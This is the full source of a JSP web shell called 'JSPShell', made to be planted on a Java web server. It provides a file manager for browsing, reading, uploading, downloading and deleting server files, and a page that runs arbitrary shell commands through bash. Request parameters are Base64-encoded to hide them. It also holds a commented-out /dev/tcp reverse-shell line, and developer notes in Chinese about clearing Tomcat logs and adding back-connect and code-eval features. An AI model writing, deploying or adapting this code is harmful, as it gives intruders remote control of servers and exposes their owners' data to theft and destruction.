<%@ page import="java.util.*" %>
<%@ page import="java.io.*" %>
<%@ page import="java.net.InetAddress" %>
<%@ page import="java.net.URLEncoder" %>
<%@ page import="sun.misc.BASE64Decoder" %>
<%@ page import="sun.misc.BASE64Encoder" %>
<%@ page import="java.util.zip.CRC32" %>
<%@ page import="java.util.zip.CheckedOutputStream" %>
<%@ page import="java.util.zip.ZipEntry" %>
<%@ page import="java.util.zip.ZipOutputStream" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%! // define functions here.
public static class ZipCompressor {
    static final int BUFFER = 8192;

    private File zipFile;

    public ZipCompressor(String pathName) {
        zipFile = new File(pathName);
    }
    public void compress(String... pathName) {
        ZipOutputStream out = null;
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(zipFile);
            CheckedOutputStream cos = new CheckedOutputStream(fileOutputStream,
                    new CRC32());
            out = new ZipOutputStream(cos);
            String basedir = "";
            for (int i=0;i<pathName.length;i++){
                compress(new File(pathName[i]), out, basedir);
            }
            out.close();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
    public void compress(String srcPathName) {
        File file = new File(srcPathName);
        if (!file.exists())
            throw new RuntimeException(srcPathName + "不存在！");
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(zipFile);
            CheckedOutputStream cos = new CheckedOutputStream(fileOutputStream,
                    new CRC32());
            ZipOutputStream out = new ZipOutputStream(cos);
            String basedir = "";
            compress(file, out, basedir);
            out.close();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private void compress(File file, ZipOutputStream out, String basedir) {
        if (file.isDirectory()) {
            this.compressDirectory(file, out, basedir);
        } else {
            this.compressFile(file, out, basedir);
        }
    }

    private void compressDirectory(File dir, ZipOutputStream out, String basedir) {
        if (!dir.exists())
            return;

        File[] files = dir.listFiles();
        for (int i = 0; i < files.length; i++) {
            compress(files[i], out, basedir + dir.getName() + "/");
        }
    }

    private void compressFile(File file, ZipOutputStream out, String basedir) {
        if (!file.exists()) {
            return;
        }

        try {
            BufferedInputStream bis = new BufferedInputStream(
                    new FileInputStream(file));
            ZipEntry entry = new ZipEntry(basedir + file.getName());
            out.putNextEntry(entry);
            int count;
            byte data[] = new byte[BUFFER];

            while ((count = bis.read(data, 0, BUFFER)) != -1) {
                out.write(data, 0, count);
            }

            bis.close();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}

public static class FileManager {

    public static boolean delete (String pathname) {
        File file = new File(pathname);

        if (file.isDirectory()) {
            File[] files = file.listFiles();
            for(int i=0; i<files.length; i++) {
                delete(files[i].getAbsolutePath());
            }
        }

        return file.delete();
    }

    public static boolean delete (String ...files) {
        for (String file : files) {
            delete(file);
        }

        return true;
    }

    public static void copydir (String src, String dst) throws IOException {
        File file = new File(src);
        String[] files = file.list();

        if (!(new File(dst)).exists()) {
            new File(dst).mkdir();
        }

        for (int i = 0; i < files.length; i++) {
            String _src = src + file.separator + files[i];
            String _dst = dst  + file.separator + files[i];
            if (new File(_src).isDirectory()) {
                copydir(_src, _dst);
            } else {
                FileManager.copyfile(_src, _dst);
            }
        }
    }

    public static void copyfile (String src, String dst) throws IOException {
        FileInputStream fileInputStream = new FileInputStream(new File(src));
        FileOutputStream fileOutputStream = new FileOutputStream(new File(dst));
        byte[] bytes = new byte[2048];
        int len = 0;

        while ((len = fileInputStream.read(bytes)) != -1) {
            fileOutputStream.write(bytes, 0, len);
        }

        fileInputStream.close();
        fileOutputStream.close();
    }

    public static boolean copy (String src, String dst) throws IOException {
        if (new File(src).isFile()) {
            FileManager.copyfile(src, dst);
        } else {
            FileManager.copydir(src, dst);
        }

        return true;
    }

    public static boolean move (String src, String dst) {
        new File(src).renameTo(new File(dst));
        return true;
    }

    public static String pwd () {
        return System.getProperty("user.dir");
    }

    public static byte[] readBytes (String pathname) throws IOException {
        File file = new File(pathname);
        FileInputStream fileInputStream = new FileInputStream(file);
        int length = fileInputStream.available();
        byte bytes[] = new byte[length];

        fileInputStream.read(bytes);
        fileInputStream.close();
        return bytes;
    }

    public static void writeBytes (String pathname, byte[] bytes) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream(pathname);
        fileOutputStream.write(bytes);  
        fileOutputStream.close();
    }

    public static void writeText (String pathname, String data, String encoding) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream(pathname);
        fileOutputStream.write(data.getBytes(encoding));  
        fileOutputStream.close();
    }

    public static String readText (String pathname, String encoding) throws IOException {
        byte[] bytes = readBytes(pathname);
        return new String(bytes, encoding);
    }

    public static void zip (String savepath, String ...files) {
        ZipCompressor zipCompressor = new ZipCompressor(savepath);
        zipCompressor.compress(files);
    }

    public static String stemname (String pathname) {
        String filename = new File(pathname).getName();
        int n = filename.lastIndexOf(".");
        return n >= 0 ? filename.substring(0, n) : pathname;
    }

    public static String extname (String pathname) {
        String filename = new File(pathname).getName();
        int n = filename.lastIndexOf(".");
        return n >= 0 ? filename.substring(n + 1) : "";
    }

    public static String dirname (String pathname) {
        return new File(pathname).getParent();
    }

    public static String basename (String pathname) {
        return new File(pathname).getName();
    }

    public static String join (String ...names) {
        String pathname = names[0];

        for (int i = 1; i < names.length; i++) {
            pathname += File.separator + names[i];
        }

        return pathname;
    }

    public static boolean touch (String pathname) {
        try {
            new File(pathname).createNewFile();
            return true;
        } catch (IOException e) {
            return false;
        }
    }

    public static String getSafePath (String pathname, String filename) {
        int n = 1;
        String stemname = stemname(filename);
        String extname = extname(filename);
        String path = pathname + File.separator + filename;

        while (new File(path).exists()) {
            n ++;
            path = pathname + File.separator + String.format("%s %d.%s", stemname, n, extname);
        }

        return path;
    }
}

public class Utils {
    public HttpServletRequest request;
    public HttpServletResponse response;
    public HttpSession session;
    public String listPath = "";
    public String payload = "";
    public String extra = "";
    public String action = "";
    public String __file__ = "";
    public String __dir__ = "";
    public String status = "";
    public String payloadEncrypted = "";

    public Utils (HttpServletRequest request, HttpServletResponse response) {
        this.request = request;
        this.response = response;
        this.session = request.getSession();
        this.payload = request.getParameter("payload");
        this.extra = request.getParameter("extra");
        this.action = request.getParameter("action");
        this.__file__ = request.getRealPath(request.getServletPath());
        this.__dir__ = new File(__file__).getParent();
        this.payloadEncrypted = this.payload;
        this.init();
    }

    public void init() {
        if (this.action == null) {
            this.action = "listdir";
        }
        this.action = this.action.toLowerCase();
        if (this.payload != null) {
            if (!this.payload.equals("upload")) {
                this.payload = this.decrypt(this.payload);
            }
        }
        if (this.extra != null) {
            this.extra = this.decrypt(this.extra);
        }
        // get listpath from session, if not, get from working dir
        Object dir = this.session.getAttribute("listPath");
        this.listPath = (dir != null) ? (String)dir : this.__dir__;

        if (this.action.equals("listdir")) {
            // fix listpath
            if (this.payload != null) {
                if (new File(this.payload).isDirectory()) {
                    this.listPath = this.payload;
                    this.session.setAttribute("listPath", this.listPath);
                }
            }

            this.payload = this.listPath;
        }
    }

    public String showStatus () {
        return this.status.equals("") ? "" : "document.getElementById('info').innerHTML='[" + this.status + "]';";
    }

    public String curPath(String file) {
        return this.listPath + File.separator + file;
    }

    public String mapDrive () {
        String r = "";
        File file = new File(this.listPath);

        while (true) {
            String data = this.encrypt(file.getPath());

            r = String.format("<a href='?action=listdir&payload=%s'>%s</a>" + File.separator, data, file.getName()) + r;
            if (file.getParentFile() == null) {
                break;
            }
            file = file.getParentFile();
        }

        return r;
    }

    public String fileType (File file) {
        String name = file.getName();
        return file.isDirectory() ? "DIR" : name.substring(name.lastIndexOf(".") + 1);
    }

    // convert filesize to human readtable style.
    public String fileSize (long n) {
        n = Math.abs(n);
        String[] s = new String[]{"B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"};
        int e = (n != 0) ? (int)Math.floor(Math.log(n) / Math.log(1024)) : 0;

        if (s[e].equals("B")) {
            return String.format("%d " + s[e], (int)(n / Math.pow(1024, Math.floor(e))));
        }

        return String.format("%.2f " + s[e], n / Math.pow(1024, Math.floor(e)));
    }

    public String filePerm () {
        return "";
    }

    public String decrypt (String data) {
        try {
            //return new String(Base64.getDecoder().decode(data));
            BASE64Decoder decoder = new BASE64Decoder();
            return new String(decoder.decodeBuffer(data), "utf-8");
        } catch (Exception e) {
            return null;
        }
    }

    public String encrypt (String data) {
        return new BASE64Encoder().encode(data.getBytes());
    }

    public String execute (String command) {
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
            InputStreamReader streamReader = new InputStreamReader(process.getInputStream(), "utf-8");
            BufferedReader bufferedReader = new BufferedReader(streamReader);
            String line = bufferedReader.readLine();
            String r = "";
            
            while (line != null) {
                r += line + "\n"; 
                line = bufferedReader.readLine();
            }

            return r;
        } catch (IOException e) {
            return "-shell: " + command + ": command not found";
        }
    }

    public boolean download (String pathname) throws UnsupportedEncodingException, IOException {
        String filename = new File(pathname).getName(); 
        String userAgent = this.request.getHeader("User-Agent");            
        String fixedname = (userAgent.toLowerCase().indexOf("chrome") > 0) ? new String(filename.getBytes("UTF-8"), "ISO8859-1") : URLEncoder.encode(filename, "UTF-8");

        this.response.addHeader("content-Type", "application/octet-stream");
        this.response.addHeader("content-Disposition", "clickment;filename=" + fixedname);

        FileInputStream in = new FileInputStream(pathname);
        ServletOutputStream out = this.response.getOutputStream();

        byte[] buffer = new byte[1024];
        int len = -1;

        while ((len = in.read(buffer)) != -1) {
            out.write(buffer, 0, len);
        }

        out.close();
        in.close();
        return true;
    } 

    public void walkDir (File file) {
        for (File i : file.listFiles()) {
            String filename = i.getName();
            String pathname = i.getAbsolutePath();

            if (i.getName().indexOf(this.payload) != -1) {
                this.searchResultNum ++;
                this.searchResult += String.format("<tr><td><a href=?action=listdir&payload= onclick='this.href+=encrypt(this.innerText)' target=_blank>%s</a></td>" + 
                    "<td><a href=?g= target=_blank>%s</a></td>" + 
                    "<td><center></center></td></tr>", i.getAbsoluteFile().getParent(), i.getName());
            }

            if(i.isDirectory()) {
                this.walkDir(i);
            }
        }
    }

    public String searchResult = "";
    public int searchResultNum = 0;

    public void search () {
        this.searchResult = "";
        this.searchResultNum = 0;
        this.walkDir(new File(this.listPath));
    }

    public void setStatus (boolean r, String y, String n) {
        this.status = r ? y : "<span class=col-error>" + n + "</span>";
    }

    public String htmlEncode(String r) {
        return r.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;");
    }

}%><!DOCTYPE html>
<html>
<head>
<meta charset=utf-8>
<title>JSPShell</title>
<script src=//www.winpro8.com/well/js/base64.js></script>
<link rel="stylesheet" href="shell.css">
<!-- initialize -->
<script type="text/javascript">
<% Utils utils = new Utils(request, response); %>
    var __dir__ = '<%= utils.__dir__ %>';   // 
    var __list__ = '<%= utils.listPath %>'; // listing path
    var __parent__ = '<%= new File(utils.listPath).getParent() %>'; // listing path parent  
    var __drive__ = "<%= utils.mapDrive() %>";
    var __action__ = '<%= utils.action %>';
    var __sep__ = '<%= File.separator %>';
</script>
</head>
<body>    
<div class=wrapper>
    <div class=menu><ul>
        <li><a id=mainmenu-expl href=#>Explorer</a></li>
        <li><a href=?action=shell>Shell</a></li>
        <li><a href=?action=database>Database</a></li>
        <li><a href=?action=reverse>Reverse</a></li>
        <li id=info></li>
    </ul></div>
    <div class=menu-directory>
        <input type=submit value='Parent' id=dirmenu-parent ←> 
        <input type=submit value='⟳' id=dirmenu-refresh>
        <input type=submit id=map-switch value=+>
        <span id=map1></span>
        <script type="text/javascript">document.getElementById('map1').innerHTML=__drive__;</script>
        <input id=map2 type=text>
    </div>
    <div class=content>   
    <% 
    if (utils.action.equals("view")) {
        String content = FileManager.readText(utils.payload, "gbk");
        %>
        <textarea id=sourcefocus name=sourcecode rows=30 cols=100><%= utils.htmlEncode(content) %></textarea>
        <input type=submit value=Save name=save>
        <%
    } else if (utils.action.equals("shell")) {
        String hostname = InetAddress.getLocalHost().getHostName().toString();
        String dir = System.getProperty("user.dir");
        String name = System.getProperty("user.name");
        %>
        <form name=shell method=POST onsubmit="this.payload.value = encrypt(this.payload.value)">
            <pre><span style='color:red'><%= name + "@" + hostname %></span>:<span style='color:#6600FF'><%= dir %></span>$ <input type=text autofocus autocomplete=off name=payload style='width:30%;outline:none;border:none'></pre>
            <input type=hidden name=action value=shell>
        </form>
    <%
        if (utils.payload != null) {
            out.print("<pre>" + utils.htmlEncode(utils.execute(utils.payload)) + "</pre>");
        }
    } else if (utils.action.equals("search")) {
        utils.search();
        %>
        <input type=submit value=Search id=search>
        <label style='margin-left:10px'>
            <font class='on'>Search: <span class=col-warn><%= utils.payload %></span> | Found's: <span class=col-warn><%= utils.searchResultNum %></span></font>
        </label> 
        <table class='table sortable'>
            <tr>
                <th>Directory</th>
                <th>Name</th>
                <th>Act</th>
            </tr>
            <tbody><%= utils.searchResult %></tbody>
        </table>

        <%
    } else if (utils.action.equals("database")) {
        out.print("developing...");
    } else if (utils.action.equals("reverse")) {
        out.print("developing...");
        //utils.execute("bash -i >& /dev/tcp/127.0.0.1/443 0>&1 &");
    } else { 
        Object _selectedFiles = request.getParameterValues("files");
        if (_selectedFiles != null) {
            String[] selectedFiles = (String[])_selectedFiles;
            // combin file path
            for (int i = 0; i < selectedFiles.length; i++) {
                selectedFiles[i] = new File(utils.curPath(selectedFiles[i])).toString();
            }

            if (utils.action.equals("copy")) {
            } else if (utils.action.equals("move")) {
            } else if (utils.action.equals("delete")) {
                FileManager.delete(selectedFiles);
            } else if (utils.action.equals("compress")) {
                String archivePath = FileManager.getSafePath(utils.listPath, "Archive.zip");
                FileManager.zip(archivePath, selectedFiles);
                utils.status = "Compress success " + FileManager.basename(archivePath) + " Saved";
            }
            
        } else {
            File fileAct = new File(utils.curPath(utils.payload));
            String filename = "<span class=col-warn>" + new File(utils.payload).getName() + "</span>";

            if (utils.action.equals("touch")) {
                utils.setStatus(FileManager.touch(fileAct.toString()), filename + " Touched", "Touch " + filename + " failed");
            } 
            else if (utils.action.equals("mkdir")) {
                utils.setStatus(fileAct.mkdir(), "Directory " + filename + " created", "Create directory " + filename + " failed");
            } 
            else if (utils.action.equals("delete")) {
                utils.setStatus(FileManager.delete(utils.payload), filename + " Removed", "Remove " + filename + " failed");
            } 
            else if (utils.action.equals("download")) {
                utils.download(utils.payload);
            } 
            else if (utils.action.equals("move")) {
                utils.setStatus(FileManager.move(utils.payload, utils.extra), "Move success", "Move failed");
            } 
            else if (utils.action.equals("copy")) {
                utils.setStatus(FileManager.copy(utils.payload, utils.extra), "Copy success", "Copy failed");
            } 
            else if (utils.action.equals("compress")) {
                String oldName = FileManager.basename(utils.payload);
                String name = oldName + ".zip";
                String archivePath = FileManager.getSafePath(utils.listPath, name);
                filename = "<span class=col-warn>" + FileManager.basename(archivePath) + "</span>";
                FileManager.zip(archivePath, utils.payload);
                try {
                    utils.status = "Compress " + "<span class=col-warn>" + oldName + "</span>" + " Success " + filename + " Saved";
                } catch (Exception e) {
                    utils.status = "<span class=col-error>Compress " + filename + " failed</span>";
                }
            } 
            else if (utils.action.equals("upload")) {
                String pathname = utils.curPath(utils.extra);
                filename = "<span class=col-warn>" + new File(pathname).getName() + "</span>";
                String content = utils.payloadEncrypted;
                try {
                    byte[] bytes = new BASE64Decoder().decodeBuffer(content);
                    FileManager.writeBytes(pathname, bytes);
                    utils.status = filename + " Saved";
                } catch (Exception e) {
                    utils.status = "<span class=col-error>Upload " + filename + " failed</span>";
                }
                
            } else if (utils.action.equals("write")) {
                //utils.status = fileAct.renameTo(new File(utils.extra)) ? "Move success" : "Move failed";
            }
        }
        %><table>
        <tr>
            <td><input type=submit value='New Dir' id=filemenu-newdir></td>
            <td><input type=submit value='New File' id=filemenu-newfile></td>
            <td><input type=submit value=Search id=filemenu-search></td>
            <td><label><input type=file id=filemenu-upload><input type=submit value=Upload id=upload-action></label></td>
            <td>
                <select id=filemenu-actions style='margin-left:3px;margin-right: 8px'>
                    <option>Selected Action</option>
                    <!-- <option>Copy</option>
                    <option>Move</option> -->
                    <option>Delete</option>
                    <option>compress</option>
                </select>
            </td>
            <td><span id=filemenu-selected>Selected: [<span class=col-warn>0</span>] </span><span id=filemenu-filecount>Dir's: [0] File's: [0]</span></td>
        </tr>
    </table>
    <form method=POST id=file-list>
    <table class='table sortable'>
        <tr>
            <th class=sorttable_nosort><input type=checkbox id=check-all></th>
            <th class=sorttable_numeric>Name</th>
            <th>Action</th>
            <th>Size</th>
            <th>Perms</th>
            <th>Owner:Group</th>
            <th>Modified</th>
        </tr>
    <tbody><%
        File[] files = new File(utils.listPath).listFiles();
        
        Arrays.sort(files, new Comparator<File>() {
            public int compare(File f1, File f2) {
                long diff = f1.lastModified() - f2.lastModified();
                if (diff > 0)
                    return 1;
                else if (diff == 0)
                    return 0;
                else
                    return -1;
            }
            public boolean equals(Object obj) {
                return true;
            }
        });

        for (int i=0; i<files.length; i++) {
            File file = files[i];
            boolean isDir = file.isDirectory();
            String name = file.getName();
            String type = utils.fileType(file).toUpperCase();
            String perm = "";
            String owner = "";//Files.getFileAttributeView(path, FileOwnerAttributeView.class).getOwner().getName();
            String size = utils.fileSize(file.length());
            String last = (new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss")).format(file.lastModified());
            String color = isDir ? "#00BFFF" : (name.indexOf(".") == 0 ? "white" : "");
            String fullPath = utils.encrypt(file.getAbsolutePath());
            String action = (isDir ? "listdir" : "view") + "&payload=" + fullPath;

            out.print(
                "<tr class=file-manager>" + 
                "<td><center><input type=checkbox name=files></center></td>" + 
                "<td><a style='color: " + color + "' href='?action=" + action + "'>" + name + "</a></td>" + 
                "<td filename='" + name + "' pathname='" + file.getAbsolutePath() + "'>" + 
                    "<a class=action href=# act=delete style='color:red'>Del</a>" + 
                    "<a class=action href=# act=move>Move</a>" +
                    "<a class=action href=# act=copy>Copy</a>" +
                    "<a class=action href=# act=compress>Compress</a>" +
                    (isDir ? "" : "<a class=action href=# act=download>Download</a>") +
                "</td>" + 
                "<td><center>" + size + "</center></td>" + 
                "<td><center>" + perm + "</center></td>" + 
                "<td><center>" + owner + "</center></td>" + 
                "<td><center>" + last + "</center></td>" + 
                 "<tr>"
            );
        }
        %>
    </tbody>
    </table>
    </form><%
    } %>
    </div>
</div>

<script>
function encrypt (data) {
    return Base64.encode(data);
}

function decrypt (data) {
    return Base64.decode(data);
}

function request (action, payload, extra) {
    //console.log('payload length: ' + payload.length);
    //console.log('payload  encrypted length: ' + encrypt(payload).length);
    if (typeof payload === 'string') {
        payload = (action == 'upload') ? payload : encrypt(payload);
        var form = document.body.appendChild(document.createElement('form')),
            html = "<input type=text name=payload value='" + payload + "'>",
            extra = extra || "";

        html += "<input type=text name=action value='" + action + "'>";
        html += "<input type=text name=extra value='" + encrypt(extra) + "'>";

        form.action = location.origin + location.pathname;
        form.method = 'POST';
        form.style.display = 'none';
        form.innerHTML = html;
        form.submit();
    }
}

function $id (e) { 
    return document.getElementById(e);
}

function $click (id, func) {
    var e = $id(id);
    if (e != null) {
        // addEventLisnter not work!
        e.onclick = function (e) {
            func(e);
        };
    }
}

function $val (e, value) {
    return (value !== undefined) ? e.setAttribute('value', value) : e.getAttribute('value');
}

var fileManager = {
    listdir: function (pathname) {
        request('listdir', pathname);
    },

    compress: function (pathname) {
        request('compress', pathname);
    },

    move: function (pathname) {
        var t = prompt('Move', pathname);
        if ((t !== "") && (t != null)) {
            request('move', pathname, t);
        }
    },

    copy: function (pathname) {
        var t = prompt('Copy', pathname);
        if ((t !== "") && (t != null)) {
            request('copy', pathname, t);
        }
    },

    delete: function (pathname) {
        if (confirm("'Delete: [" + pathname + "] ?'")) {
            request('delete', pathname);
        }
    },

    prompt: function (title, action, value) {
        var t = prompt(title, value || "");
        if ((t !== "") && (t != null)) {
            request(action, t);
        }
    },
    write: function (filename, content) {
        request('write', filename, content);
    },

    mkdir: function () {
        fileManager.prompt('New Dir', 'mkdir');
    }, 

    touch: function () {
        fileManager.prompt('New File', 'touch');
    },

    search: function () {
        fileManager.prompt('Search File', 'search');
    },

    download: function (pathname) {
        request('download', pathname);
    },

    perform: function (e) {
        var filename = e.parentNode.getAttribute('filename'),
            action = e.innerText;
            pathname = decrypt(e.parentNode.parentNode.getAttribute('pathname'));
    },
}

$click('map-switch', function (e) {
    var m1 = $id('map1'), m2 = $id('map2');
    if (m1.style.display === 'none') {
        m1.style.display = 'inline-block';
        m2.style.display = 'none';
    } else {
        m1.style.display = 'none';
        m2.style.display = 'inline-block';
    }
});

$id('map2').onblur = function() {
    $id('map1').style.display = 'inline-block';
    $id('map2').style.display = 'none';
}

$id('map2').onkeypress = function (e) {
    if ((e.which || e.keyCode) == 13) {
        fileManager.listdir($id('map2').value);
    }
}

var uploader = $id('filemenu-upload');
if (uploader != null) {
    uploader.onchange = function (e) {
        var fileReader = new FileReader(),
            file = this.files[0];

        fileReader.readAsDataURL(file);

        fileReader.onload = function (e) {
            var data = e.target.result.split(',')[1];
            request('upload', data, file.name);
        }
    }
}

var fileCount = 0, dirCount = 0, selectedCount = 0,
    files = document.getElementsByClassName('file-manager');

for (var i = files.length - 1; i >= 0; i--) {
    var file = files[i],
        acts = file.getElementsByTagName('a'),
        filename = file.getElementsByTagName('td')[1].innerText,
        chk = file.getElementsByTagName('input')[0];

    chk.setAttribute('value', filename);
    // count file、dir
    if (acts[0].href.indexOf('action=view') >= 0) {
        fileCount += 1;
    } else {
        dirCount += 1;
    }
    chk.onchange = function (e) {
        selectedCount += (this.checked ? 1 : -1);
        $id('filemenu-selected').innerHTML = "Selected: [<span class=col-warn>" + selectedCount + "</span>] ";
    };
    // bind actions
    for (var k = acts.length - 1; k >= 0; k--) {
        if (acts[k].hasAttribute('act')) {
            acts[k].onclick = function () {
                fileManager[this.getAttribute('act')](this.parentNode.getAttribute('pathname'));
            }
        } 
    }
}

if ($id('filemenu-filecount') != null) {
    $id('filemenu-filecount').innerHTML = "Dir's: [<span class=col-warn>" + dirCount + "</span>] File's: [<span class=col-warn>" + fileCount + "</span>]";
}

$click('check-all', function () {
    var checked = $id('check-all').checked;
    for (var i = files.length - 1; i >= 0; i--) {
        chk = files[i].getElementsByTagName('input')[0].checked = checked;
    }
    selectedCount = checked ? files.length : 0;
    $id('filemenu-selected').innerHTML = "Selected: [<span class=col-warn>" + selectedCount + "</span>] ";
});

var meunActions = $id('filemenu-actions');
if (meunActions != null) {
    meunActions.onchange = function (e) {
        if (this.selectedIndex != 0) {
            var op = this.options[this.selectedIndex], 
                form = $id('file-list'), 
                action = op.innerHTML.toLowerCase();
            form.action = "?action=" + action;
            form.submit();
        }
    };
} 

$click('filemenu-newdir', function () {
    fileManager.mkdir();
});

$click('filemenu-newfile', function () {
    fileManager.touch();
});

$click('filemenu-search', function () {
    fileManager.search();
});

$click('search', function () {
    fileManager.search();
});

$click('dirmenu-parent', function () {
    fileManager.listdir(__parent__);
});

$click('dirmenu-refresh', function () {
    fileManager.listdir(__list__);
});

$click('mainmenu-expl', function () {
    fileManager.listdir(__dir__);
});

$click('upload-action', function () {
    $id("filemenu-upload").click();
})


$val($id('map2'), __list__);
</script>
<script><%= utils.showStatus() %></script>
<div class=copyright>JSPShell &copy; 2020 | Author yuforever9@gmail.com</div>
</body>
</html>

<%--

清理日志/usr/local/tomcat-fccszt/logs

<pre><%= utils.payload %></pre>
不能使用 switch foreach 语法

-- 不能使用的库 
不能使用 foreach、switch 语法
不能使用 java.util.Base64
不能使用 "".isEmpty()
不能使用 java.nio


-- 待开发、改进功能

zip文件后缀添加 Uncompress 解压按钮
  
shell 功能实现 cd 命令

jspspy 
Back connect
JSP Env  列举java、系统环境
Eval Java Code  1.上传java class文件执行 2.执行jsp代码
数据库管理


---- bug



---- 低级bug
删除文件夹有几率报错

批量压缩文件时没有结果提示

文件上产功能不能上传过大文件，小于1.5m的没问题

有些文件目录没有读权限，点进入后报错
 
线上运行 字体小 跟本地不一样,但是在mac 浏览器上一样，在chrome不一样

无权限读文件时 打开文件会报错

--%>